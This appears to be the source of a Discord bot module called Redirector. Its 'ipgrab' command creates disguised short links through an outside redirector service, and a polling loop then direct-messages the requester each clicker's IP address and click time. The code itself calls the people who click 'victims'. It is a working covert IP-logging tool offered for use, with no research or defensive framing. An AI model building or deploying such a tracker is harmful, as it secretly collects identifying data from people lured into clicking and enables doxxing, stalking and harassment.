from datetime import datetime
from logging import Logger, getLogger
from math import floor
from typing import Optional, Any

from aiohttp import ClientSession
from discord import Embed, User, HTTPException
from discord.ext.commands import Cog, command, Option, Context
from discord.ext.tasks import loop
from motor.motor_asyncio import AsyncIOMotorCollection

from utils.bots import BOT_TYPES, CustomContext
from utils.database import Document
from utils.misc import random_string, UTC_OFFSET

API_URL: str = "https://redirector.regulad.xyz/"
SHORT_URL: str = "https://crud.space/"

logger: Logger = getLogger(__name__)


class LoggedEvent:
    """A logged redirector event."""

    def __init__(self, link_id: str, redirected_to: str, redirected_at: datetime, remote: str, document: Document):
        self.link_id: str = link_id
        self.redirected_to: str = redirected_to
        self.redirected_at: datetime = redirected_at
        self.remote: str = remote
        self.document: Document = document

    __slots__ = ('link_id', 'redirected_to', 'redirected_at', 'remote', 'document')


async def get_listen_doc(collection: AsyncIOMotorCollection, link_id: str) -> Document:
    return await Document.get_document(collection, {"_id": link_id})


def get_collection(bot: BOT_TYPES) -> AsyncIOMotorCollection:
    """Returns the database for the Redirector cog."""
    return bot.database["redirector"]


class Redirector(Cog):
    """A cog that allows you to use Redirector, an IP logging and analytics service."""

    def __init__(self, bot: BOT_TYPES) -> None:
        self.bot: BOT_TYPES = bot
        self.client_session: Optional[ClientSession] = None

    @Cog.listener()
    async def on_ready(self) -> None:
        # TODO: Webhook implementation

        self.check_for_redirections.start()

    @loop(seconds=60)
    async def check_for_redirections(self) -> None:
        await self.get_client()

        async for raw_document in get_collection(self.bot).find({}):
            document: Document = Document(raw_document, collection=get_collection(self.bot),
                                          query={"_id": raw_document["_id"]})

            if document.get("listening_user") is None:
                continue
            else:
                async with self.client_session.get(f"{API_URL}hits/{document['_id']}") as response:
                    if response.status == 200:
                        data: list[dict[str, Any]] = await response.json()
                        for entry in data:
                            timestamp: datetime = datetime.fromisoformat(entry["timestamp"])
                            if timestamp > document["last_checked"]:
                                self.bot.dispatch(
                                    "redirection",
                                    LoggedEvent(
                                        entry["link_id"],
                                        entry["redirected_to"],
                                        timestamp,
                                        entry["remote"],
                                        document,
                                    )
                                )

                        await document.update_db({"$currentDate": {"last_checked": True}})
                    else:
                        logger.warning(f"Failed to get redirections for {document['_id']}")

    async def get_client(self) -> None:
        if self.client_session is None:
            self.client_session = ClientSession()

    async def cog_before_invoke(self, ctx: Context) -> None:
        await self.get_client()

    def cog_unload(self) -> None:
        if self.client_session is not None:
            self.bot.loop.create_task(self.client_session.close())
        if self.check_for_redirections.is_running():
            self.check_for_redirections.stop()

    @Cog.listener()
    async def on_redirection(self, logged_event: LoggedEvent) -> None:
        """A listener that is called when a redirection is logged."""

        listening_document: Document = logged_event.document

        if listening_document.get("listening_user") is not None:
            listening_user: User = (
                    self.bot.get_user(listening_document["listening_user"])
                    or await self.bot.fetch_user(listening_document["listening_user"])
            )

            await listening_user.send(
                "An IP address has been grabbed!",
                embed=(
                    Embed(
                        title="Result",
                        description=f"Regarding campaign ID `{logged_event.link_id}`"
                    )
                        .add_field(
                        name="Redirected to:",
                        value=f"[{logged_event.redirected_to}]({logged_event.redirected_to})"
                    )
                        .add_field(
                        name="Redirected at:",
                        value=f"<t:{floor((logged_event.redirected_at - UTC_OFFSET).timestamp())}>"
                    )
                        .add_field(
                        name="IP Address:",
                        value=f"`{logged_event.remote}`"
                    )
                )
            )

    @command()
    async def stopgrabbing(
            self,
            ctx: CustomContext,
            link_id: str = Option(name="campaign_id", description="The campaign ID to stop listening to.")
    ) -> None:
        """Stops listening to a campaign ID."""

        await ctx.defer(ephemeral=True)

        listening_document: Document = await get_listen_doc(get_collection(self.bot), link_id)

        if listening_document.get("listening_user") is None:
            await ctx.send("That campaign ID is not being listened to.", ephemeral=True)
            return

        if listening_document["listening_user"] != ctx.author.id:
            await ctx.send("You are not listening to that campaign ID.", ephemeral=True)
            return

        await listening_document.delete_db()
        await ctx.send("You are no longer listening to that campaign ID.", ephemeral=True)

    @command()
    async def ipgrab(
            self,
            ctx: CustomContext,
            destination: str = Option(description="The URL to redirect the victim to.")
    ) -> None:
        """Allows you to grab the IP address of a user by getting them to follow a link."""

        await ctx.defer(ephemeral=True)

        link_id: str = random_string(length=6)

        # Start listening
        listening_document: Document = await get_listen_doc(get_collection(self.bot), link_id)
        await listening_document.update_db(
            {"$set": {"listening_user": ctx.author.id}, "$currentDate": {"last_checked": True, "created_at": True}}
        )

        async with self.client_session.post(f"{API_URL}{link_id}", data=destination) as response:
            if response.status != 201:
                raise HTTPException(response, response.reason)  # Possibly jank. It should be fine.

        # TODO: Webhook implementation

        await ctx.send(
            f"IP grabber created: <{SHORT_URL}{link_id}>\n"
            f"Your campaign ID is: `{link_id}`\n"
            f"Make sure your DMs are open. You will receive notifications there.",
            ephemeral=True
        )

    # TODO: Campaign summaries


def setup(bot: BOT_TYPES) -> None:
    """Loads the Redirector cog."""
    bot.add_cog(Redirector(bot))
